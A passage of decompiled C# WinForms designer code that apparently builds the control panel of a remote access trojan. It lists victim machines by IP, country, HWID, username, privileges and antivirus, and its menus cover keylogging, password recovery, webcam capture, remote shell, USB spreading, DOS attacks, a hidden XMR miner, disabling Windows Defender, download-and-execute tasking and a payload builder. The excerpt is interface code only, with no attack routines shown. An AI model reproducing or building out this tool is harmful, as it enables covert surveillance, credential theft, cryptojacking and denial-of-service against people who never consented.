      this.columnHeader5 = new ColumnHeader();
      this.contextMenuTasks = new ContextMenuStrip(this.components);
      this.pASSWORDRECOVERYToolStripMenuItem = new ToolStripMenuItem();
      this.downloadAndExecuteToolStripMenuItem = new ToolStripMenuItem();
      this.sENDFILETOMEMORYToolStripMenuItem1 = new ToolStripMenuItem();
      this.minerToolStripMenuItem1 = new ToolStripMenuItem();
      this.uPDATEToolStripMenuItem1 = new ToolStripMenuItem();
      this.toolStripSeparator4 = new ToolStripSeparator();
      this.dELETETASKToolStripMenuItem = new ToolStripMenuItem();
      this.performanceCounter1 = new PerformanceCounter();
      this.performanceCounter2 = new PerformanceCounter();
      this.notifyIcon1 = new NotifyIcon(this.components);
      this.TimerTask = new System.Windows.Forms.Timer(this.components);
      this.shutdownToolStripMenuItem1 = new ToolStripMenuItem();
      this.restartToolStripMenuItem3 = new ToolStripMenuItem();
      this.logoffToolStripMenuItem1 = new ToolStripMenuItem();
      this.closeToolStripMenuItem1 = new ToolStripMenuItem();
      this.restartToolStripMenuItem2 = new ToolStripMenuItem();
      this.updateToolStripMenuItem2 = new ToolStripMenuItem();
      this.uninstallToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator3 = new ToolStripSeparator();
      this.showFolderToolStripMenuItem = new ToolStripMenuItem();
      this.clientToolStripMenuItem = new ToolStripMenuItem();
      this.contextMenuClient.SuspendLayout();
      this.statusStrip1.SuspendLayout();
      this.tabControl1.SuspendLayout();
      this.tabPage1.SuspendLayout();
      this.tabPage2.SuspendLayout();
      this.contextMenuLogs.SuspendLayout();
      this.tabPage3.SuspendLayout();
      this.contextMenuThumbnail.SuspendLayout();
      this.tabPage4.SuspendLayout();
      this.contextMenuTasks.SuspendLayout();
      this.performanceCounter1.BeginInit();
      this.performanceCounter2.BeginInit();
      this.SuspendLayout();
      this.listView1.BorderStyle = BorderStyle.None;
      this.listView1.Columns.AddRange(new ColumnHeader[12]
      {
        this.lv_ip,
        this.lv_country,
        this.lv_group,
        this.lv_hwid,
        this.lv_user,
        this.lv_os,
        this.lv_version,
        this.lv_ins,
        this.lv_admin,
        this.lv_av,
        this.lv_ping,
        this.lv_act
      });
      this.listView1.ContextMenuStrip = this.contextMenuClient;
      this.listView1.Dock = DockStyle.Fill;
      this.listView1.FullRowSelect = true;
      this.listView1.GridLines = true;
      this.listView1.HideSelection = false;
      this.listView1.Location = new Point(3, 3);
      this.listView1.Name = "listView1";
      this.listView1.ShowGroups = false;
      this.listView1.ShowItemToolTips = true;
      this.listView1.Size = new Size(1287, 440);
      this.listView1.TabIndex = 0;
      this.listView1.UseCompatibleStateImageBehavior = false;
      this.listView1.View = View.Details;
      this.listView1.ColumnClick += new ColumnClickEventHandler(this.ListView1_ColumnClick);
      this.listView1.KeyDown += new KeyEventHandler(this.listView1_KeyDown);
      this.listView1.MouseMove += new MouseEventHandler(this.listView1_MouseMove);
      this.lv_ip.Text = "IP Address";
      this.lv_ip.Width = 121;
      this.lv_country.Text = "Country";
      this.lv_country.Width = 124;
      this.lv_group.Text = "Group";
      this.lv_group.Width = 110;
      this.lv_hwid.Text = "HWID";
      this.lv_hwid.Width = 117;
      this.lv_user.Text = "Username";
      this.lv_user.Width = 117;
      this.lv_os.Text = "Operating System";
      this.lv_os.Width = 179;
      this.lv_version.Text = "Payload Version";
      this.lv_version.Width = 126;
      this.lv_ins.Text = "Installed";
      this.lv_ins.Width = 120;
      this.lv_admin.Text = "Privileges";
      this.lv_admin.Width = 166;
      this.lv_av.Text = "Anti-Virus Software";
      this.lv_av.Width = 136;
      this.lv_ping.Text = "Ping";
      this.lv_act.Text = "Active Window";
      this.lv_act.Width = 350;
      this.contextMenuClient.ImageScalingSize = new Size(24, 24);
      this.contextMenuClient.Items.AddRange(new ToolStripItem[11]
      {
        (ToolStripItem) this.aBOUTToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator2,
        (ToolStripItem) this.sENDFILEToolStripMenuItem,
        (ToolStripItem) this.monitoringToolStripMenuItem,
        (ToolStripItem) this.miscellaneousToolStripMenuItem,
        (ToolStripItem) this.extraToolStripMenuItem,
        (ToolStripItem) this.systemToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator1,
        (ToolStripItem) this.serverToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator5,
        (ToolStripItem) this.bUILDERToolStripMenuItem
      });
      this.contextMenuClient.Name = "contextMenuStrip1";
      this.contextMenuClient.Size = new Size(238, 278);
      this.aBOUTToolStripMenuItem.Image = (Image) Resources.info;
      this.aBOUTToolStripMenuItem.Name = "aBOUTToolStripMenuItem";
      this.aBOUTToolStripMenuItem.Size = new Size(202, 32);
      this.aBOUTToolStripMenuItem.Text = "ABOUT";
      this.aBOUTToolStripMenuItem.Click += new EventHandler(this.ABOUTToolStripMenuItem_Click);
      this.toolStripSeparator2.Name = "toolStripSeparator2";
      this.toolStripSeparator2.Size = new Size(199, 6);
      this.sENDFILEToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.tOMEMORYToolStripMenuItem,
        (ToolStripItem) this.tODISKToolStripMenuItem
      });
      this.sENDFILEToolStripMenuItem.Image = (Image) Resources.tomem;
      this.sENDFILEToolStripMenuItem.Name = "sENDFILEToolStripMenuItem";
      this.sENDFILEToolStripMenuItem.Size = new Size(202, 32);
      this.sENDFILEToolStripMenuItem.Text = "Send File";
      this.tOMEMORYToolStripMenuItem.Image = (Image) Resources.tomem1;
      this.tOMEMORYToolStripMenuItem.Name = "tOMEMORYToolStripMenuItem";
      this.tOMEMORYToolStripMenuItem.Size = new Size(206, 34);
      this.tOMEMORYToolStripMenuItem.Text = "To Memory";
      this.tOMEMORYToolStripMenuItem.Click += new EventHandler(this.TOMEMORYToolStripMenuItem_Click);
      this.tODISKToolStripMenuItem.Image = (Image) Resources.tomem1;
      this.tODISKToolStripMenuItem.Name = "tODISKToolStripMenuItem";
      this.tODISKToolStripMenuItem.Size = new Size(206, 34);
      this.tODISKToolStripMenuItem.Text = "To Disk";
      this.tODISKToolStripMenuItem.Click += new EventHandler(this.TODISKToolStripMenuItem_Click);
      this.monitoringToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[7]
      {
        (ToolStripItem) this.remoteDesktopToolStripMenuItem1,
        (ToolStripItem) this.keyloggerToolStripMenuItem1,
        (ToolStripItem) this.passwordRecoveryToolStripMenuItem1,
        (ToolStripItem) this.fileManagerToolStripMenuItem1,
        (ToolStripItem) this.processManagerToolStripMenuItem1,
        (ToolStripItem) this.reportWindowToolStripMenuItem,
        (ToolStripItem) this.webcamToolStripMenuItem
      });
      this.monitoringToolStripMenuItem.Image = (Image) Resources.monitoring_system;
      this.monitoringToolStripMenuItem.Name = "monitoringToolStripMenuItem";
      this.monitoringToolStripMenuItem.Size = new Size(202, 32);
      this.monitoringToolStripMenuItem.Text = "Monitoring";
      this.remoteDesktopToolStripMenuItem1.Image = (Image) Resources.remotedesktop;
      this.remoteDesktopToolStripMenuItem1.Name = "remoteDesktopToolStripMenuItem1";
      this.remoteDesktopToolStripMenuItem1.Size = new Size(267, 34);
      this.remoteDesktopToolStripMenuItem1.Text = "Remote Desktop";
      this.remoteDesktopToolStripMenuItem1.Click += new EventHandler(this.RemoteDesktopToolStripMenuItem1_Click);
      this.keyloggerToolStripMenuItem1.Image = (Image) Resources.logger;
      this.keyloggerToolStripMenuItem1.Name = "keyloggerToolStripMenuItem1";
      this.keyloggerToolStripMenuItem1.Size = new Size(267, 34);
      this.keyloggerToolStripMenuItem1.Text = "Keylogger";
      this.keyloggerToolStripMenuItem1.Click += new EventHandler(this.KeyloggerToolStripMenuItem1_Click);
      this.passwordRecoveryToolStripMenuItem1.Image = (Image) Resources.key;
      this.passwordRecoveryToolStripMenuItem1.Name = "passwordRecoveryToolStripMenuItem1";
      this.passwordRecoveryToolStripMenuItem1.Size = new Size(267, 34);
      this.passwordRecoveryToolStripMenuItem1.Text = "Password Recovery";
      this.passwordRecoveryToolStripMenuItem1.Click += new EventHandler(this.PasswordRecoveryToolStripMenuItem1_Click);
      this.fileManagerToolStripMenuItem1.Image = (Image) Resources.filemanager;
      this.fileManagerToolStripMenuItem1.Name = "fileManagerToolStripMenuItem1";
      this.fileManagerToolStripMenuItem1.Size = new Size(267, 34);
      this.fileManagerToolStripMenuItem1.Text = "File Manager";
      this.fileManagerToolStripMenuItem1.Click += new EventHandler(this.FileManagerToolStripMenuItem1_Click);
      this.processManagerToolStripMenuItem1.Image = (Image) Resources.process;
      this.processManagerToolStripMenuItem1.Name = "processManagerToolStripMenuItem1";
      this.processManagerToolStripMenuItem1.Size = new Size(267, 34);
      this.processManagerToolStripMenuItem1.Text = "Process Manager";
      this.processManagerToolStripMenuItem1.Click += new EventHandler(this.ProcessManagerToolStripMenuItem1_Click);
      this.reportWindowToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.runToolStripMenuItem1,
        (ToolStripItem) this.stopToolStripMenuItem2
      });
      this.reportWindowToolStripMenuItem.Image = (Image) Resources.report;
      this.reportWindowToolStripMenuItem.Name = "reportWindowToolStripMenuItem";
      this.reportWindowToolStripMenuItem.Size = new Size(267, 34);
      this.reportWindowToolStripMenuItem.Text = "Report Window";
      this.runToolStripMenuItem1.Name = "runToolStripMenuItem1";
      this.runToolStripMenuItem1.Size = new Size(152, 34);
      this.runToolStripMenuItem1.Text = "Run";
      this.runToolStripMenuItem1.Click += new EventHandler(this.RunToolStripMenuItem1_Click);
      this.stopToolStripMenuItem2.Name = "stopToolStripMenuItem2";
      this.stopToolStripMenuItem2.Size = new Size(152, 34);
      this.stopToolStripMenuItem2.Text = "Stop";
      this.stopToolStripMenuItem2.Click += new EventHandler(this.StopToolStripMenuItem2_Click);
      this.webcamToolStripMenuItem.Image = (Image) Resources.webcam;
      this.webcamToolStripMenuItem.Name = "webcamToolStripMenuItem";
      this.webcamToolStripMenuItem.Size = new Size(267, 34);
      this.webcamToolStripMenuItem.Text = "Webcam";
      this.webcamToolStripMenuItem.Click += new EventHandler(this.WebcamToolStripMenuItem_Click);
      this.miscellaneousToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[8]
      {
        (ToolStripItem) this.botsKillerToolStripMenuItem,
        (ToolStripItem) this.uSBSpreadToolStripMenuItem1,
        (ToolStripItem) this.seedTorrentToolStripMenuItem1,
        (ToolStripItem) this.remoteShellToolStripMenuItem1,
        (ToolStripItem) this.dOSAttackToolStripMenuItem,
        (ToolStripItem) this.executeNETCodeToolStripMenuItem,
        (ToolStripItem) this.xMRMinerToolStripMenuItem,
        (ToolStripItem) this.filesSearcherToolStripMenuItem
      });
      this.miscellaneousToolStripMenuItem.Image = (Image) Resources.Miscellaneous;
      this.miscellaneousToolStripMenuItem.Name = "miscellaneousToolStripMenuItem";
      this.miscellaneousToolStripMenuItem.Size = new Size(202, 32);
      this.miscellaneousToolStripMenuItem.Text = "Miscellaneous";
      this.botsKillerToolStripMenuItem.Image = (Image) Resources.botkiller;
      this.botsKillerToolStripMenuItem.Name = "botsKillerToolStripMenuItem";
      this.botsKillerToolStripMenuItem.Size = new Size(270, 34);
      this.botsKillerToolStripMenuItem.Text = "Bots Killer";
      this.botsKillerToolStripMenuItem.Click += new EventHandler(this.BotsKillerToolStripMenuItem_Click);
      this.uSBSpreadToolStripMenuItem1.Image = (Image) Resources.usb;
      this.uSBSpreadToolStripMenuItem1.Name = "uSBSpreadToolStripMenuItem1";
      this.uSBSpreadToolStripMenuItem1.Size = new Size(270, 34);
      this.uSBSpreadToolStripMenuItem1.Text = "USB Spread";
      this.uSBSpreadToolStripMenuItem1.Click += new EventHandler(this.USBSpreadToolStripMenuItem1_Click);
      this.seedTorrentToolStripMenuItem1.Image = (Image) Resources.u_torrent_logo;
      this.seedTorrentToolStripMenuItem1.Name = "seedTorrentToolStripMenuItem1";
      this.seedTorrentToolStripMenuItem1.Size = new Size(270, 34);
      this.seedTorrentToolStripMenuItem1.Text = "Seed Torrent";
      this.seedTorrentToolStripMenuItem1.Click += new EventHandler(this.SeedTorrentToolStripMenuItem1_Click_1);
      this.remoteShellToolStripMenuItem1.Image = (Image) Resources.shell;
      this.remoteShellToolStripMenuItem1.Name = "remoteShellToolStripMenuItem1";
      this.remoteShellToolStripMenuItem1.Size = new Size(270, 34);
      this.remoteShellToolStripMenuItem1.Text = "Remote Shell";
      this.remoteShellToolStripMenuItem1.Click += new EventHandler(this.RemoteShellToolStripMenuItem1_Click_1);
      this.dOSAttackToolStripMenuItem.Image = (Image) Resources.ddos;
      this.dOSAttackToolStripMenuItem.Name = "dOSAttackToolStripMenuItem";
      this.dOSAttackToolStripMenuItem.Size = new Size(270, 34);
      this.dOSAttackToolStripMenuItem.Text = "DOS Attack";
      this.dOSAttackToolStripMenuItem.Click += new EventHandler(this.DOSAttackToolStripMenuItem_Click_1);
      this.executeNETCodeToolStripMenuItem.Image = (Image) Resources.coding;
      this.executeNETCodeToolStripMenuItem.Name = "executeNETCodeToolStripMenuItem";
      this.executeNETCodeToolStripMenuItem.Size = new Size(270, 34);
      this.executeNETCodeToolStripMenuItem.Text = "Execute .NET Code";
      this.executeNETCodeToolStripMenuItem.Click += new EventHandler(this.ExecuteNETCodeToolStripMenuItem_Click_1);
      this.xMRMinerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.runToolStripMenuItem,
        (ToolStripItem) this.killToolStripMenuItem
      });
      this.xMRMinerToolStripMenuItem.Image = (Image) Resources.xmr;
      this.xMRMinerToolStripMenuItem.Name = "xMRMinerToolStripMenuItem";
      this.xMRMinerToolStripMenuItem.Size = new Size(270, 34);
      this.xMRMinerToolStripMenuItem.Text = "XMR Miner";
      this.xMRMinerToolStripMenuItem.Visible = false;
      this.runToolStripMenuItem.Image = (Image) Resources.play_button;
      this.runToolStripMenuItem.Name = "runToolStripMenuItem";
      this.runToolStripMenuItem.Size = new Size(152, 34);
      this.runToolStripMenuItem.Text = "Run";
      this.runToolStripMenuItem.Click += new EventHandler(this.RunToolStripMenuItem_Click);
      this.killToolStripMenuItem.Image = (Image) Resources.stop__1_;
      this.killToolStripMenuItem.Name = "killToolStripMenuItem";
      this.killToolStripMenuItem.Size = new Size(152, 34);
      this.killToolStripMenuItem.Text = "Stop";
      this.killToolStripMenuItem.Click += new EventHandler(this.KillToolStripMenuItem_Click);
      this.filesSearcherToolStripMenuItem.Image = (Image) Resources.report;
      this.filesSearcherToolStripMenuItem.Name = "filesSearcherToolStripMenuItem";
      this.filesSearcherToolStripMenuItem.Size = new Size(270, 34);
      this.filesSearcherToolStripMenuItem.Text = "Files Searcher";
      this.filesSearcherToolStripMenuItem.Click += new EventHandler(this.filesSearcherToolStripMenuItem_Click);
      this.extraToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[7]
      {
        (ToolStripItem) this.visitWebsiteToolStripMenuItem1,
        (ToolStripItem) this.sendMessageBoxToolStripMenuItem1,
        (ToolStripItem) this.chatToolStripMenuItem1,
        (ToolStripItem) this.getAdminPrivilegesToolStripMenuItem,
        (ToolStripItem) this.blankScreenToolStripMenuItem,
        (ToolStripItem) this.disableWindowsDefenderToolStripMenuItem,
        (ToolStripItem) this.setWallpaperToolStripMenuItem
      });
      this.extraToolStripMenuItem.Image = (Image) Resources.extra;
      this.extraToolStripMenuItem.Name = "extraToolStripMenuItem";
      this.extraToolStripMenuItem.Size = new Size(202, 32);
      this.extraToolStripMenuItem.Text = "Extra";
      this.visitWebsiteToolStripMenuItem1.Image = (Image) Resources.visit;
      this.visitWebsiteToolStripMenuItem1.Name = "visitWebsiteToolStripMenuItem1";
      this.visitWebsiteToolStripMenuItem1.Size = new Size(329, 34);
      this.visitWebsiteToolStripMenuItem1.Text = "Visit Website";
      this.visitWebsiteToolStripMenuItem1.Click += new EventHandler(this.VisitWebsiteToolStripMenuItem1_Click);
      this.sendMessageBoxToolStripMenuItem1.Image = (Image) Resources.msgbox;
      this.sendMessageBoxToolStripMenuItem1.Name = "sendMessageBoxToolStripMenuItem1";
      this.sendMessageBoxToolStripMenuItem1.Size = new Size(329, 34);
      this.sendMessageBoxToolStripMenuItem1.Text = "Send MessageBox";
      this.sendMessageBoxToolStripMenuItem1.Click += new EventHandler(this.SendMessageBoxToolStripMenuItem1_Click);
      this.chatToolStripMenuItem1.Image = (Image) Resources.chat;
      this.chatToolStripMenuItem1.Name = "chatToolStripMenuItem1";
      this.chatToolStripMenuItem1.Size = new Size(329, 34);
      this.chatToolStripMenuItem1.Text = "Chat";
      this.chatToolStripMenuItem1.Click += new EventHandler(this.ChatToolStripMenuItem1_Click);
      this.getAdminPrivilegesToolStripMenuItem.Image = (Image) Resources.uac;
      this.getAdminPrivilegesToolStripMenuItem.Name = "getAdminPrivilegesToolStripMenuItem";
      this.getAdminPrivilegesToolStripMenuItem.Size = new Size(329, 34);
      this.getAdminPrivilegesToolStripMenuItem.Text = "Get Admin Privileges";
      this.getAdminPrivilegesToolStripMenuItem.Click += new EventHandler(this.GetAdminPrivilegesToolStripMenuItem_Click_1);
      this.blankScreenToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.runToolStripMenuItem2,
        (ToolStripItem) this.stopToolStripMenuItem1
      });
      this.blankScreenToolStripMenuItem.Image = (Image) Resources.blank_screen;
      this.blankScreenToolStripMenuItem.Name = "blankScreenToolStripMenuItem";
      this.blankScreenToolStripMenuItem.Size = new Size(329, 34);
      this.blankScreenToolStripMenuItem.Text = "Blank Screen";
      this.runToolStripMenuItem2.Image = (Image) Resources.play_button;
      this.runToolStripMenuItem2.Name = "runToolStripMenuItem2";
      this.runToolStripMenuItem2.Size = new Size(152, 34);
      this.runToolStripMenuItem2.Text = "Run";
      this.runToolStripMenuItem2.Click += new EventHandler(this.RunToolStripMenuItem2_Click);
      this.stopToolStripMenuItem1.Image = (Image) Resources.stop__1_;
      this.stopToolStripMenuItem1.Name = "stopToolStripMenuItem1";
      this.stopToolStripMenuItem1.Size = new Size(152, 34);
      this.stopToolStripMenuItem1.Text = "Stop";
      this.stopToolStripMenuItem1.Click += new EventHandler(this.StopToolStripMenuItem1_Click);
      this.disableWindowsDefenderToolStripMenuItem.Image = (Image) Resources.disabled;
      this.disableWindowsDefenderToolStripMenuItem.Name = "disableWindowsDefenderToolStripMenuItem";
      this.disableWindowsDefenderToolStripMenuItem.Size = new Size(329, 34);
      this.disableWindowsDefenderToolStripMenuItem.Text = "Disable Windows Defender";
      this.disableWindowsDefenderToolStripMenuItem.Click += new EventHandler(this.DisableWindowsDefenderToolStripMenuItem_Click_1);
      this.setWallpaperToolStripMenuItem.Image = (Image) Resources.iconfinder_32_171485__1_;
      this.setWallpaperToolStripMenuItem.Name = "setWallpaperToolStripMenuItem";
      this.setWallpaperToolStripMenuItem.Size = new Size(329, 34);
      this.setWallpaperToolStripMenuItem.Text = "Set Wallpaper";
      this.setWallpaperToolStripMenuItem.Click += new EventHandler(this.setWallpaperToolStripMenuItem_Click);
      this.systemToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.clientToolStripMenuItem,
        (ToolStripItem) this.pCToolStripMenuItem
      });
      this.systemToolStripMenuItem.Image = (Image) Resources.system;
      this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
      this.systemToolStripMenuItem.Size = new Size(237, 32);
      this.systemToolStripMenuItem.Text = "Client Managment";
      this.pCToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.logoffToolStripMenuItem1,
        (ToolStripItem) this.restartToolStripMenuItem3,
        (ToolStripItem) this.shutdownToolStripMenuItem1
      });
      this.pCToolStripMenuItem.Image = (Image) Resources.pc;
      this.pCToolStripMenuItem.Name = "pCToolStripMenuItem";
      this.pCToolStripMenuItem.Size = new Size(158, 34);
      this.pCToolStripMenuItem.Text = "PC";
      this.toolStripSeparator1.Name = "toolStripSeparator1";
      this.toolStripSeparator1.Size = new Size(199, 6);
      this.serverToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.blockClientsToolStripMenuItem
      });
      this.serverToolStripMenuItem.Image = (Image) Resources.server;
      this.serverToolStripMenuItem.Name = "serverToolStripMenuItem";
      this.serverToolStripMenuItem.Size = new Size(202, 32);
      this.serverToolStripMenuItem.Text = "Server";
      this.blockClientsToolStripMenuItem.Image = (Image) Resources.disabled;
      this.blockClientsToolStripMenuItem.Name = "blockClientsToolStripMenuItem";
      this.blockClientsToolStripMenuItem.Size = new Size(270, 34);
      this.blockClientsToolStripMenuItem.Text = "Block Clients";
      this.blockClientsToolStripMenuItem.Click += new EventHandler(this.BlockClientsToolStripMenuItem_Click);
      this.toolStripSeparator5.Name = "toolStripSeparator5";
      this.toolStripSeparator5.Size = new Size(199, 6);
      this.bUILDERToolStripMenuItem.Image = (Image) Resources.builder;
      this.bUILDERToolStripMenuItem.Name = "bUILDERToolStripMenuItem";
      this.bUILDERToolStripMenuItem.Size = new Size(202, 32);
      this.bUILDERToolStripMenuItem.Text = "BUILDER";
      this.bUILDERToolStripMenuItem.Click += new EventHandler(this.bUILDERToolStripMenuItem_Click);
      this.statusStrip1.ImageScalingSize = new Size(24, 24);
      this.statusStrip1.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.toolStripStatusLabel2,
        (ToolStripItem) this.toolStripStatusLabel1
      });
      this.statusStrip1.Location = new Point(0, 479);
      this.statusStrip1.Name = "statusStrip1";
      this.statusStrip1.Size = new Size(1301, 32);
      this.statusStrip1.TabIndex = 1;
      this.statusStrip1.Text = "statusStrip1";
      this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
      this.toolStripStatusLabel2.Size = new Size(179, 25);
      this.toolStripStatusLabel2.Text = "[Notification]             ";
      this.toolStripStatusLabel2.Click += new EventHandler(this.ToolStripStatusLabel2_Click);
      this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
      this.toolStripStatusLabel1.Size = new Size(24, 25);
      this.toolStripStatusLabel1.Text = "...";
      this.ping.Enabled = true;
      this.ping.Interval = 30000;
      this.ping.Tick += new EventHandler(this.ping_Tick);
      this.UpdateUI.Enabled = true;
      this.UpdateUI.Interval = 500;
      this.UpdateUI.Tick += new EventHandler(this.UpdateUI_Tick);
      this.tabControl1.Controls.Add((Control) this.tabPage1);
      this.tabControl1.Controls.Add((Control) this.tabPage2);
      this.tabControl1.Controls.Add((Control) this.tabPage3);
      this.tabControl1.Controls.Add((Control) this.tabPage4);
      this.tabControl1.Dock = DockStyle.Fill;
      this.tabControl1.Location = new Point(0, 0);
      this.tabControl1.Name = "tabControl1";
      this.tabControl1.SelectedIndex = 0;
      this.tabControl1.Size = new Size(1301, 479);
      this.tabControl1.SizeMode = TabSizeMode.Fixed;
      this.tabControl1.TabIndex = 2;
      this.tabPage1.Controls.Add((Control) this.listView1);
      this.tabPage1.Location = new Point(4, 29);
      this.tabPage1.Name = "tabPage1";
      this.tabPage1.Padding = new Padding(3);
      this.tabPage1.Size = new Size(1293, 446);
      this.tabPage1.TabIndex = 0;
      this.tabPage1.Text = "Clients";
      this.tabPage2.Controls.Add((Control) this.listView2);
      this.tabPage2.Location = new Point(4, 29);
      this.tabPage2.Name = "tabPage2";
      this.tabPage2.Padding = new Padding(3);
      this.tabPage2.Size = new Size(1293, 446);
      this.tabPage2.TabIndex = 1;
      this.tabPage2.Text = "Logs";
      this.tabPage2.UseVisualStyleBackColor = true;
      this.listView2.BorderStyle = BorderStyle.None;
      this.listView2.Columns.AddRange(new ColumnHeader[2]
      {
        this.columnHeader1,
        this.columnHeader2
      });
      this.listView2.ContextMenuStrip = this.contextMenuLogs;
      this.listView2.Dock = DockStyle.Fill;
      this.listView2.FullRowSelect = true;
      this.listView2.GridLines = true;
      this.listView2.HideSelection = false;
      this.listView2.Location = new Point(3, 3);
      this.listView2.Name = "listView2";
      this.listView2.ShowGroups = false;
      this.listView2.ShowItemToolTips = true;
      this.listView2.Size = new Size(1287, 440);
      this.listView2.TabIndex = 1;
      this.listView2.UseCompatibleStateImageBehavior = false;
      this.listView2.View = View.Details;
      this.columnHeader1.Text = "Time";
      this.columnHeader1.Width = 150;
      this.columnHeader2.Text = "Message";
      this.columnHeader2.Width = 1078;
      this.contextMenuLogs.ImageScalingSize = new Size(24, 24);
      this.contextMenuLogs.Items.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.cLEARToolStripMenuItem
      });
      this.contextMenuLogs.Name = "contextMenuLogs";
      this.contextMenuLogs.ShowImageMargin = false;
      this.contextMenuLogs.Size = new Size(111, 36);
      this.cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
      this.cLEARToolStripMenuItem.Size = new Size(110, 32);
      this.cLEARToolStripMenuItem.Text = "CLEAR";
      this.cLEARToolStripMenuItem.Click += new EventHandler(this.CLEARToolStripMenuItem_Click);
      this.tabPage3.Controls.Add((Control) this.listView3);
      this.tabPage3.Location = new Point(4, 29);
      this.tabPage3.Name = "tabPage3";
      this.tabPage3.Size = new Size(1293, 446);
      this.tabPage3.TabIndex = 2;
      this.tabPage3.Text = "Thumbnail";
      this.tabPage3.UseVisualStyleBackColor = true;
      this.listView3.ContextMenuStrip = this.contextMenuThumbnail;
      this.listView3.Dock = DockStyle.Fill;
      this.listView3.HideSelection = false;
      this.listView3.LargeImageList = this.ThumbnailImageList;
      this.listView3.Location = new Point(0, 0);
      this.listView3.Name = "listView3";
      this.listView3.ShowItemToolTips = true;
      this.listView3.Size = new Size(1293, 446);
      this.listView3.SmallImageList = this.ThumbnailImageList;
      this.listView3.TabIndex = 0;
      this.listView3.UseCompatibleStateImageBehavior = false;
      this.contextMenuThumbnail.ImageScalingSize = new Size(24, 24);
      this.contextMenuThumbnail.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.sTARTToolStripMenuItem,
        (ToolStripItem) this.sTOPToolStripMenuItem
      });
      this.contextMenuThumbnail.Name = "contextMenuStrip2";
      this.contextMenuThumbnail.Size = new Size(144, 68);
      this.sTARTToolStripMenuItem.Image = (Image) Resources.play_button;
      this.sTARTToolStripMenuItem.Name = "sTARTToolStripMenuItem";
      this.sTARTToolStripMenuItem.Size = new Size(143, 32);
      this.sTARTToolStripMenuItem.Text = "START";
      this.sTARTToolStripMenuItem.Click += new EventHandler(this.STARTToolStripMenuItem_Click);
      this.sTOPToolStripMenuItem.Image = (Image) Resources.stop__1_;
      this.sTOPToolStripMenuItem.Name = "sTOPToolStripMenuItem";
      this.sTOPToolStripMenuItem.Size = new Size(143, 32);
      this.sTOPToolStripMenuItem.Text = "STOP";
      this.sTOPToolStripMenuItem.Click += new EventHandler(this.STOPToolStripMenuItem_Click);
      this.ThumbnailImageList.ColorDepth = ColorDepth.Depth16Bit;
      this.ThumbnailImageList.ImageSize = new Size(256, 256);
      this.ThumbnailImageList.TransparentColor = Color.Transparent;
      this.tabPage4.Controls.Add((Control) this.listView4);
      this.tabPage4.Location = new Point(4, 29);
      this.tabPage4.Name = "tabPage4";
      this.tabPage4.Padding = new Padding(3);
      this.tabPage4.Size = new Size(1293, 446);
      this.tabPage4.TabIndex = 3;
      this.tabPage4.Text = "Tasks";
      this.tabPage4.UseVisualStyleBackColor = true;
      this.listView4.BorderStyle = BorderStyle.None;
      this.listView4.Columns.AddRange(new ColumnHeader[2]
      {
        this.columnHeader4,
        this.columnHeader5
      });
      this.listView4.ContextMenuStrip = this.contextMenuTasks;
      this.listView4.Dock = DockStyle.Fill;
      this.listView4.FullRowSelect = true;
      this.listView4.HideSelection = false;
      this.listView4.Location = new Point(3, 3);
      this.listView4.Name = "listView4";
      this.listView4.Size = new Size(1287, 440);
      this.listView4.TabIndex = 0;
      this.listView4.UseCompatibleStateImageBehavior = false;
      this.listView4.View = View.Details;
      this.columnHeader4.Text = "Task";
      this.columnHeader4.Width = 97;
      this.columnHeader5.Text = "Execution";
      this.columnHeader5.Width = 116;
      this.contextMenuTasks.ImageScalingSize = new Size(24, 24);
      this.contextMenuTasks.Items.AddRange(new ToolStripItem[7]
      {
        (ToolStripItem) this.pASSWORDRECOVERYToolStripMenuItem,
        (ToolStripItem) this.downloadAndExecuteToolStripMenuItem,
        (ToolStripItem) this.sENDFILETOMEMORYToolStripMenuItem1,
        (ToolStripItem) this.minerToolStripMenuItem1,
        (ToolStripItem) this.uPDATEToolStripMenuItem1,
        (ToolStripItem) this.toolStripSeparator4,
        (ToolStripItem) this.dELETETASKToolStripMenuItem
      });
      this.contextMenuTasks.Name = "contextMenuStrip4";
      this.contextMenuTasks.ShowImageMargin = false;
      this.contextMenuTasks.Size = new Size(250, 202);
      this.pASSWORDRECOVERYToolStripMenuItem.Name = "pASSWORDRECOVERYToolStripMenuItem";
      this.pASSWORDRECOVERYToolStripMenuItem.Size = new Size(249, 32);
      this.pASSWORDRECOVERYToolStripMenuItem.Text = "PASSWORD RECOVERY";
      this.pASSWORDRECOVERYToolStripMenuItem.Click += new EventHandler(this.PASSWORDRECOVERYToolStripMenuItem_Click);
      this.downloadAndExecuteToolStripMenuItem.Name = "downloadAndExecuteToolStripMenuItem";
      this.downloadAndExecuteToolStripMenuItem.Size = new Size(249, 32);
      this.downloadAndExecuteToolStripMenuItem.Text = "SEND FILE TO DISK";
      this.downloadAndExecuteToolStripMenuItem.Click += new EventHandler(this.DownloadAndExecuteToolStripMenuItem_Click);
      this.sENDFILETOMEMORYToolStripMenuItem1.Name = "sENDFILETOMEMORYToolStripMenuItem1";
      this.sENDFILETOMEMORYToolStripMenuItem1.Size = new Size(249, 32);
      this.sENDFILETOMEMORYToolStripMenuItem1.Text = "SEND FILE TO MEMORY";
